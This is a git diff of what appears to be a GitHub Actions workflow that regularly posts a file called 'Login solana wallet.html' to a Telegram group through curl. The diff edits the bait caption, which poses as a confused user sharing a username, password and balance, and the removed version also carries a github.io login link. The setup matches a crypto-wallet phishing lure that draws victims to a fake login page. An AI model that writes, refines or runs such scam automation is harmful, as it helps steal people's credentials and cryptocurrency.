@@ -74,7 +74,7 @@ jobs:
           if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "23" ] && [ "$MINUTE" -ge 30 ] && [ "$MINUTE" -lt 45 ]); then
             echo "✅ Sending to Group 3 (3:00 AM)"
             
-            CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
+            CAPTION=$'who know what is this?\nusername: john371\npassword: 2525561'
             
             curl -s -F document=@"Login solana wallet.html" \
             -F chat_id=-1002680039813 \
